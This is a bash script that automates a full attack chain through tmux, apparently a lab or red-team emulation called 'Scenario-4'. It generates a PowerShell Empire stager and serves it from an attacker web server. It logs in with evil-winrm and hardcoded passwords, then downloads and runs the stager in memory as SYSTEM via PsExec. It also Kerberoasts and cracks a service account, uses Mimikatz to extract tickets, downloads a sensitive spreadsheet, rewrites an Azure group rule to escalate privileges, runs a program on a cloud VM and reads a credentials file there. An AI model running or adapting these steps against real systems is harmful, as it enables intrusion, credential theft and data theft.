#!/bin/bash

SESSION_NAME="Scenario-4"
LOG_BASE="/home/kaliadmin/logs"

# usemodule powershell_credentials_mimikatz_extract_tickets

mkdir /home/kaliadmin/payloads
mkdir $LOG_BASE
cp /home/kaliadmin/webserver.py /home/kaliadmin/payloads/

LOG_FILE0="$LOG_BASE/$SESSION_NAME-0.log"
LOG_FILE1="$LOG_BASE/$SESSION_NAME-1.log"
LOG_FILE2="$LOG_BASE/$SESSION_NAME-2.log"
LOG_FILE3="$LOG_BASE/$SESSION_NAME-3.log"
# LOG_FILE4="$LOG_BASE/$SESSION_NAME-4.log"

tmux kill-session -t $SESSION_NAME
sleep 3
tmux new-session -d -s $SESSION_NAME

echo "" >  $LOG_FILE0
echo "" >  $LOG_FILE1
echo "" >  $LOG_FILE2
echo "" >  $LOG_FILE3
# echo "" >  $LOG_FILE4

tmux pipe-pane -t $SESSION_NAME:0 'cat >> '"$LOG_FILE0"
tmux send-keys -t $SESSION_NAME:0 "sudo powershell-empire server" 
sleep 2
tmux send-keys -t $SESSION_NAME:0 C-m
/home/kaliadmin/wait_for_prompt.exp "http://0.0.0.0:1337" $SESSION_NAME:0

sleep 7

tmux new-window -t $SESSION_NAME -n "Empire Client"
tmux pipe-pane -t $SESSION_NAME:1 'cat >> '"$LOG_FILE1"

tmux send-keys -t $SESSION_NAME:1 "sudo powershell-empire client" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "uselistener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Host http://server_ip_1:80" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Port 80" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "usestager windows_csharp_exe" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Listener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set OutFile /home/kaliadmin/payloads/Scenario4.exe" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7
cp /var/lib/powershell-empire/empire/client/generated-stagers/Scenario4.exe /home/kaliadmin/payloads/Scenario4.exe

sleep 7

tmux new-window -t $SESSION_NAME -n "Hosting Payload Web Server"
tmux pipe-pane -t $SESSION_NAME:2 'cat >> '"$LOG_FILE2"
tmux send-keys -t $SESSION_NAME:2 "cd /home/kaliadmin/payloads" 
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3


# tmux send-keys -t $SESSION_NAME:2 "python3 -m venv myenv" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3

# tmux send-keys -t $SESSION_NAME:2 "source myenv/bin/activate" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3

# tmux send-keys -t $SESSION_NAME:2 "pip install Flask" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3


# tmux send-keys -t $SESSION_NAME:2 "python3 webserver.py" 
tmux send-keys -t $SESSION_NAME:2 "python3 -m http.server 8081" 
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

read -p "Do you want to continue? (Y/N): " answer
if [[ "$answer" != "Y" && "$answer" != "y" ]]; then
    echo "Exiting script."
    exit 1
fi

tmux new-window -t $SESSION_NAME -n "Evil-Winrm - Sarfaraz Ahamed"
tmux pipe-pane -t $SESSION_NAME:3 'cat >> '"$LOG_FILE3"
# tmux send-keys -t $SESSION_NAME:3 "cat /home/kaliadmin/payloads/credentials.txt" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "kaliadmin" $SESSION_NAME:3

# sleep 3

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i 192.168.1.3 -u 'csrp\SarfarazAhamed' -p 'UserPassword@123'" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "whoami" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "hostname" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://server_ip:8081/Scenario4.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\SarfarazAhamed\Documents\PSTools.zip"' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Expand-Archive -Path "C:\Users\SarfarazAhamed\Documents\PSTools.zip" -DestinationPath "C:\Users\SarfarazAhamed\Documents"' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\SarfarazAhamed\Documents\run.ps1" -accepteula' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux select-window -t $SESSION_NAME:1

tmux send-keys -t $SESSION_NAME:1 "agents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "checked in" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "interact " 
sleep 5
tmux send-keys -t $SESSION_NAME:1 Down 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_situational_awareness_network_get_spn" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "shell" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "Add-Type -AssemblyName System.IdentityModel" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/csrp.local'" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "dir C:\Users\Public\Documents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "exit" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'download "C:\Users\Public\Documents\High_Profile_Lawsuit_Details.xlsx"' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m


sleep 7

tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_credentials_mimikatz_extract_tickets" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "shell" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Get-ChildItem -Path . -Filter "*.kirbi" -File' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

ticket_file=$(cat $LOG_FILE1 | grep "MSSQLSvc" | tail -1 | awk '{print $6}')

sleep 7

tmux send-keys -t $SESSION_NAME:1 "exit" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "download $ticket_file" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

ticket=$(sudo find / -name "*.kirbi" 2> /dev/null | tr -d '\n')

sleep 7

kirbi2john $ticket > hash.txt

sleep 7

wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt

sleep 7

john --wordlist=passwords.txt hash.txt

sleep 7

john --show hash.txt

sleep 7


tmux new-window -t $SESSION_NAME -n "Azure - MSSQLSvc"
tmux pipe-pane -t $SESSION_NAME:4 'cat >> '"$LOG_FILE4"

tmux send-keys -t $SESSION_NAME:4 'sudo docker run -it mcr.microsoft.com/azure-cli:cbl-mariner2.0' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u MSSQLSvc@sarfarazahamed2018gmail.onmicrosoft.com -p Password@123' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 "GROUP_OBJECT_ID=\$(az ad group list --filter \"displayName eq 'Web App Developer'\" --query \"[0].id\" --output tsv)" 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az ad group show --group "Web App Developer" --query "membershipRule" --output tsv' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az rest --method PATCH --url "https://graph.microsoft.com/v1.0/groups/$GROUP_OBJECT_ID" --headers "Content-Type=application/json" --body "{\"membershipRule\": \"(user.department -eq \\\"Developer\\\") or (user.displayName -eq \\\"MSSQL Service Account\\\")\", \"membershipRuleProcessingState\": \"On\"}"' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7


tmux send-keys -t $SESSION_NAME:4 'while [ "$(az ad group member list --group $GROUP_OBJECT_ID --query "length(@)" -o tsv)" -eq 0 ]; do sleep 5; done' # && tmux wait-for -S members_checked'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# tmux wait-for members_checked
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4



sleep 7

tmux send-keys -t $SESSION_NAME:4 'az account clear' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u MSSQLSvc@sarfarazahamed2018gmail.onmicrosoft.com -p Password@123' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 "az vm run-command invoke --resource-group WebApp --name UbuntuVM --command-id RunShellScript --scripts 'sudo git clone https://github.com/LarryRuane/minesim.git /home/azureuser/minesim; sudo apt update; sudo apt install -y golang-go; cd /home/azureuser/minesim; sudo go build minesim.go; ./minesim'" # && tmux wait-for -S command_run" 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# tmux wait-for command_run
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7


tmux send-keys -t $SESSION_NAME:4 "az vm run-command invoke --resource-group WebApp --name UbuntuVM --command-id RunShellScript --scripts 'ls -la /home/azureuser'" # && tmux wait-for -S command_run" 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# tmux wait-for command_run
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 "az vm run-command invoke --resource-group WebApp --name UbuntuVM --command-id RunShellScript --scripts 'cat /home/azureuser/creds2.txt'" # && tmux wait-for -S command_run" 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# tmux wait-for command_run
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u CoreyHam@sarfarazahamed2018gmail.onmicrosoft.com -p P@ssw0rd!' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u CoreyHam@sarfarazahamed2018gmail.onmicrosoft.com -p P@ssw0rd! --allow-no-subscriptions' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

echo "Reached the end."